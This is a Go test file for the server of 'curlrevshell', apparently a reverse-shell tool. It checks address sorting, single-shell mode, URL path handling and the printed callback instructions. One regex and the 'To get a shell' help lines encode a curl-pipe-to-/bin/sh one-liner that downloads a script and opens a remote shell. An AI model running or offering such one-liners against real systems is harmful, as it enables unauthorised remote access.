package hsrv

/*
 * hsrv_test.go
 * Tests for hserv.go
 * By J. Stuart McMurray
 * Created 20240324
 * Last Modified 20241210
 */

import (
	"context"
	"crypto/tls"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"log/slog"
	"maps"
	"net"
	"net/http"
	"reflect"
	"regexp"
	"slices"
	"strings"
	"sync"
	"testing"

	"github.com/magisterquis/curlrevshell/internal/iobroker"
	"github.com/magisterquis/curlrevshell/lib/chanlog"
	"github.com/magisterquis/curlrevshell/lib/crstemplate"
	"github.com/magisterquis/curlrevshell/lib/ctxerrgroup"
	"github.com/magisterquis/curlrevshell/lib/opshell"
)

var (
	// errTestEnding indicates we're cancelling a context because the test
	// is over.
	errTestEnding = errors.New("test ending")
)

// newTestServer is newTestServerMaybeWithDir without a static files directory.
func newTestServer(t *testing.T) (
	chanlog.ChanLog, /* Server logs. */
	chan<- string, /* From shell */
	<-chan opshell.CLine,
	*Server,
	func(),
) {
	return newTestServerMaybeWithDir(t, false)
}

// newTestServerMaybeWithDir returns a new server, suitable for testing.
// The returned function may be called to shut down the server, which will
// closs the chanLog and CLine channels.  It need not be explicitly called.
// By default, no static files directory will be made.  Set makeFDir to true
// to create one.
func newTestServerMaybeWithDir(t *testing.T, makeFDir bool) (
	chanlog.ChanLog, /* Server logs. */
	chan<- string, /* From shell */
	<-chan opshell.CLine,
	*Server,
	func(),
) {
	var (
		cl, sl = chanlog.New()
		ich    = make(chan string, 1024)
		och    = make(chan opshell.CLine, 1024)
	)
	var td string
	if makeFDir {
		td = t.TempDir()
	}
	iob, err := iobroker.New(ich, och)
	if nil != err {
		t.Fatalf("Error setting up IO Broker: %s", err)
	}
	cbAddrs := []string{"kittens.com:8888", "moose.com"}
	s, err := New(
		sl,
		"127.0.0.1:0",
		td,
		"",
		ich,
		och,
		iob,
		"",
		cbAddrs,
		true,
		false,
		crstemplate.URLPaths{
			In:     crstemplate.DefaultURLPathIn,
			InOut:  crstemplate.DefaultURLPathInOut,
			Out:    crstemplate.DefaultURLPathOut,
			Script: crstemplate.DefaultURLPathScript,
		},
	)
	if nil != err {
		t.Fatalf("Creating server: %s", err)
	}

	/* Start the server going. */
	ctx, cancel := context.WithCancelCause(context.Background())
	eg, ectx := ctxerrgroup.WithContext(ctx)
	eg.GoContext(ectx, s.Do)
	eg.GoContext(ectx, iob.Do)

	/* Function to shut down the server. */
	shutdown := sync.OnceFunc(func() {
		/* Tell everything to stop. */
		cancel(errTestEnding)
		err := eg.Wait()
		if nil != err &&
			!errors.Is(err, ErrOneShellClosed) &&
			!errors.Is(err, net.ErrClosed) &&
			!errors.Is(err, context.Canceled) {
			t.Fatalf("Unexpected server error: %s", err)
		}
		close(cl)
		close(och)
	})
	t.Cleanup(shutdown)

	/* Work out our listen port. */
	_, listenPort, err := net.SplitHostPort(s.l.Addr().String())
	if nil != err {
		t.Fatalf(
			"Error splitting listen address %s into "+
				"host and port: %s",
			s.l.Addr().String(),
			err,
		)
	}

	/* Make sure we get a listening on message. */
	type wantCLine struct {
		prep func(s string) string
		want opshell.CLine
	}
	listeningWCLs := []wantCLine{{
		want: opshell.CLine{
			Line: fmt.Sprintf("Listening on %s", s.l.Addr()),
		},
	}}
	fileWCLs := []wantCLine{{
		want: opshell.CLine{
			Color: ScriptColor,
			Line:  "To get files from " + td + ":",
		},
	}, {
		want: opshell.CLine{
			Color:       ScriptColor,
			Line:        "\n",
			NoTimestamp: true,
		},
	}, {
		want: opshell.CLine{
			Color: ScriptColor,
			Line: fmt.Sprintf(
				CurlFormat+FileSuffix,
				s.l.Fingerprint,
				cbAddrs[0],
			),
			NoTimestamp: true,
		},
	}, {
		want: opshell.CLine{
			Color: ScriptColor,
			Line: fmt.Sprintf(
				CurlFormat+FileSuffix,
				s.l.Fingerprint,
				net.JoinHostPort(cbAddrs[1], listenPort),
			),
			NoTimestamp: true,
		},
	}, {
		want: opshell.CLine{
			Color: ScriptColor,
			Line: fmt.Sprintf(
				CurlFormat+FileSuffix,
				s.l.Fingerprint,
				s.l.Addr().String(),
			),
			NoTimestamp: true,
		},
	}, {
		want: opshell.CLine{
			Color:       ScriptColor,
			Line:        "\n",
			NoTimestamp: true,
		},
	}}
	shellWCLs := []wantCLine{{
		want: opshell.CLine{
			Color: ScriptColor,
			Line:  "To get a shell:",
		},
	}, {
		want: opshell.CLine{
			Color: ScriptColor,
			Line: "\n" + strings.Join([]string{
				fmt.Sprintf(
					CurlFormat+ShellSuffix,
					s.l.Fingerprint,
					cbAddrs[0],
					crstemplate.DefaultURLPathScript,
				),
				fmt.Sprintf(
					CurlFormat+ShellSuffix,
					s.l.Fingerprint,
					net.JoinHostPort(
						cbAddrs[1],
						listenPort,
					),
					crstemplate.DefaultURLPathScript,
				),
				fmt.Sprintf(
					CurlFormat+ShellSuffix,
					s.l.Fingerprint,
					s.l.Addr().String(),
					crstemplate.DefaultURLPathScript,
				),
			}, "\n") + "\n\n",
			NoTimestamp: true,
		},
	}}
	wantCLines := make(
		[]wantCLine,
		0,
		len(listeningWCLs)+len(fileWCLs)+len(shellWCLs),
	)
	wantCLines = append(wantCLines, listeningWCLs...)
	if makeFDir {
		wantCLines = append(wantCLines, fileWCLs...)
	}
	wantCLines = append(wantCLines, shellWCLs...)
	for i, want := range wantCLines {
		got := <-och
		if nil != want.prep {
			got.Line = want.prep(got.Line)
		}
		if got != want.want {
			t.Errorf(
				"Incorrect shell message:\n"+
					"   i: %d\n"+
					" got: %#v\n"+
					"want: %#v",
				i,
				got,
				want.want,
			)
		}
	}

	/* Make sure we get exactly the logs we expect. */
	cl.ExpectEmpty(t,
		`{"time":"","level":"INFO","msg":"Listener started",`+
			`"address":"`+s.l.Addr().String()+`"}`,
	)

	/* Don't keep going if we have an error. */
	if t.Failed() {
		t.FailNow()
	}

	return cl, ich, och, s, shutdown
}

func TestServer_Smoketest(t *testing.T) {
	newTestServer(t)
}

func TestServer_SmoketestWithDir(t *testing.T) {
	newTestServerMaybeWithDir(t, true)
}

func TestSortAddresses(t *testing.T) {
	have := []string{
		"foo.com:123",
		"0.0.0.0:123",
		"[10::10]:123",
		"10.1.2.3:123",
		"9.9.9.9:125",
		"[a:a::a]:123",
		"9.9.9.9:1023",
		"9.9.9.9:123",
		"[10::10]:123",
		"9.9.9.9:124",
		"[a:9::a]:123",
		"[a:1::a]:123",
		"9.9.9.9:121",
		"[::1]:123",
		"[10::10]:123",
		"[a::a]:123",
		"[10::10]:123",
		"[9::9]:123",
		"[a:1::a]:123",
		"bar.com:123",
		"[10::10]:123",
	}
	want := []string{
		"bar.com:123",
		"foo.com:123",
		"0.0.0.0:123",
		"9.9.9.9:121",
		"9.9.9.9:123",
		"9.9.9.9:124",
		"9.9.9.9:125",
		"9.9.9.9:1023",
		"10.1.2.3:123",
		"[::1]:123",
		"[9::9]:123",
		"[a::a]:123",
		"[a:1::a]:123",
		"[a:9::a]:123",
		"[a:a::a]:123",
		"[10::10]:123",
	}
	got := sortAddresses(have)
	if len(got) != len(want) {
		t.Errorf(
			"Different length of got (%d) and want (%d) slices",
			len(got),
			len(want),
		)
	}
	for i := range min(len(got), len(want)) {
		if got[i] != want[i] {
			t.Errorf(
				"Sorted list incorrect at position %d\n"+
					"got:\n\n%s\n\n"+
					"want:\n\n%s",
				i,
				strings.Join(got, "\n"),
				strings.Join(want, "\n"),
			)
			break
		}

	}
}

// Make sure the server returns after a single shell, if oneShell is set.
func TestServer_OneShell(t *testing.T) {
	cl, _, _, s, shutdown := newTestServer(t)
	s.oneShell = true /* Only handle one shell. */

	/* HTTP Client which does not certificate validation. */
	httpc := http.Client{
		Transport: &http.Transport{TLSClientConfig: &tls.Config{
			InsecureSkipVerify: true,
		}},
	}

	/* Connect a shell. */
	var (
		id     = "kittens"
		doneCh = make(chan struct{})
		ech    = make(chan error, 2)
	)
	go func() {
		res, err := httpc.Get(
			"https://" + s.l.Addr().String() + "/i/" + id,
		)
		if nil != err {
			ech <- fmt.Errorf("request for /i: %w", err)
			return
		}
		defer res.Body.Close()
		if http.StatusOK != res.StatusCode {
			ech <- fmt.Errorf(
				"request for /i: status %s",
				res.Status,
			)
		}
		ech <- nil
	}()
	go func() {
		pr, pw := io.Pipe()
		defer pr.Close()
		defer pw.Close()
		go func() {
			<-doneCh
			pw.Close()
		}()
		res, err := httpc.Post(
			"https://"+s.l.Addr().String()+"/o/"+id,
			"",
			pr,
		)
		if nil != err {
			ech <- fmt.Errorf("request for /o: %w", err)
			return
		}
		defer res.Body.Close()
		if http.StatusOK != res.StatusCode {
			ech <- fmt.Errorf(
				"request for /o: status %s",
				res.Status,
			)
		}
		<-doneCh
		ech <- nil
	}()

	/* A different cl.Expect to account for port numbers. */
	type lmsg struct {
		Msg       string
		Direction string
	}
	expectLogMessages := func(want map[lmsg]int) {
		got := make(map[lmsg]int)
		for i := 0; i < len(want); i++ {
			select {
			case l := <-cl:
				var msg lmsg
				if err := json.Unmarshal(
					[]byte(l),
					&msg,
				); nil != err {
					t.Fatalf(
						"Error unmarshaling %s: %s",
						l,
						err,
					)
				}
				/* Direction doesn't matter when we close the
				listener. */
				if LMOneShellClosingListener == msg.Msg {
					msg.Direction = ""
				}
				got[msg]++
			case err := <-ech:
				t.Fatalf("Request error: %s", err)
			}
		}
		if !maps.Equal(got, want) {
			t.Fatalf(
				"Incorrect logs:\ngot: %q\nwant: %q",
				got,
				want,
			)
		}
	}

	/* Wait for connections to happen and the listener to close. */
	expectLogMessages(map[lmsg]int{
		{Msg: LMOneShellClosingListener}:                     1,
		{Msg: iobroker.LMNewConnection, Direction: "input"}:  1,
		{Msg: iobroker.LMNewConnection, Direction: "output"}: 1,
	})

	/* Close the shell and make sure we're told about the disconnect. */
	close(doneCh)
	shutdown()
	for i := 0; i < cap(ech); i++ {
		if err := <-ech; nil != err {
			t.Errorf(
				"Request error after listener closed: %s",
				err,
			)
		}
	}
	expectLogMessages(map[lmsg]int{
		{Msg: iobroker.LMDisconnected, Direction: "input"}:  1,
		{Msg: iobroker.LMDisconnected, Direction: "output"}: 1,
	})
	cl.ExpectEmpty(t)
}

// Make sure we can set the script URL in the output.
func TestServer_SetScriptURLPath(t *testing.T) {
	var (
		_, sl = chanlog.New()
		want  = "kittens"
	)
	s, err := New(
		sl,
		"127.0.0.1:0",
		"",
		"",
		nil,
		nil,
		nil,
		"",
		nil,
		false,
		true,
		crstemplate.URLPaths{
			In:     "up_In",
			InOut:  "up_InOut",
			Out:    "up_Out",
			Script: want,
		},
	)
	if nil != err {
		t.Fatalf("New returned error: %s", err)
	}

	/* Extract our URL bit, hopefully. */
	if ms := regexp.MustCompile(
		`curl -sk --pinnedpubkey sha256//[a-zA-Z0-9+/]+= ` +
			`https://127.0.0.1:\d+/(\S+) \| /bin/sh`,
	).FindStringSubmatch(s.cbHelp); 2 != len(ms) {
		t.Errorf("Could not parse callback help line: %q", s.cbHelp)
	} else if got := ms[1]; got != want {
		t.Errorf(
			"Incorrect script path:\n"+
				"ms[0]: %q\nms[1]: %q\n"+
				" got: %s\n"+
				"want: %s",
			ms[0], ms[1],
			got,
			want,
		)
	}
}

func TestNewUnsetURLPath(t *testing.T) {
	var (
		_, sl = chanlog.New()
	)
	_, err := New(
		sl,
		"127.0.0.1:0",
		"",
		"",
		nil,
		nil,
		nil,
		"",
		nil,
		false,
		true,
		crstemplate.URLPaths{
			In:    "up_In",
			InOut: "up_InOut",
			Out:   "up_Out",
			/* Script missing. */
		},
	)
	if nil == err {
		t.Fatalf("Did not get error")
	}
	want := "URL path unset: Script"
	if got := err.Error(); got != want {
		t.Fatalf(
			"Incorrect error:\n"+
				" got: %s\n"+
				"want: %s",
			got,
			want,
		)
	}
}

// Make sure we set ourselves up to debug-log paths correctly.
func TestSlogAttrsFromURLPaths(t *testing.T) {
	have := crstemplate.URLPaths{
		In:     "up_In",
		InOut:  "up_InOut",
		Out:    "up_Out",
		Script: "up_Script",
	}

	got := slogAttrsFromURLPaths(have)

	want := []slog.Attr{
		slog.String("In", "up_In"),
		slog.String("InOut", "up_InOut"),
		slog.String("Out", "up_Out"),
		slog.String("Script", "up_Script"),
	}

	if !slices.EqualFunc(got, want, func(a, b slog.Attr) bool {
		return a.Equal(b)
	}) {
		t.Errorf(
			"Incorrect attrs returned:\n"+
				"have: %+v\n"+
				" got: %v\n"+
				"want: %v",
			have,
			got,
			want,
		)
	}
}

func TestCleanURLPaths_UnsetField(t *testing.T) {
	full := crstemplate.URLPaths{
		In:     "up_In",
		InOut:  "up_InOut",
		Out:    "up_Out",
		Script: "up_Script",
	}
	cases := make(map[string]crstemplate.URLPaths) /* want -> have */
	for _, fn := range []string{"In", "InOut", "Out", "Script"} {
		have := full
		reflect.ValueOf(&have).Elem().FieldByName(fn).SetString("")
		cases[fn] = have
	}

	for want, have := range cases {
		t.Run(want, func(t *testing.T) {
			got := cleanURLPaths(&have)
			if got != want {
				t.Errorf(
					"Incorrect field:\n"+
						"have: %+v\n"+
						" got: %s\n"+
						"want: %s",
					have,
					got,
					want,
				)
			}
		})
	}

}

func TestCleanURLPaths_Trim(t *testing.T) {
	have := crstemplate.URLPaths{
		In:     "in/",
		InOut:  "/in_out",
		Out:    "out/",
		Script: "/////script/////",
	}
	t.Run("remove_slashes", func(t *testing.T) {
		want := crstemplate.URLPaths{
			In:     "in",
			InOut:  "in_out",
			Out:    "out",
			Script: "script",
		}
		got := have
		if ret := cleanURLPaths(&got); "" != ret {
			t.Errorf("Unexpected unset field: %s", ret)
		}
		if got != want {
			t.Errorf(
				"Incorrect cleaned paths:\n"+
					"have: %#v\n"+
					" got: %#v\n"+
					"want: %#v",
				have,
				got,
				want,
			)
		}
	})

	t.Run("empty_field", func(t *testing.T) {
		have := have
		have.Out = "////"
		want := "Out"
		if got := cleanURLPaths(&have); got != want {
			t.Errorf(
				"Missed unset path:\n"+
					"have: %#v\n"+
					" got: %#v\n"+
					"want: %#v",
				have,
				got,
				want,
			)
		}
	})
}
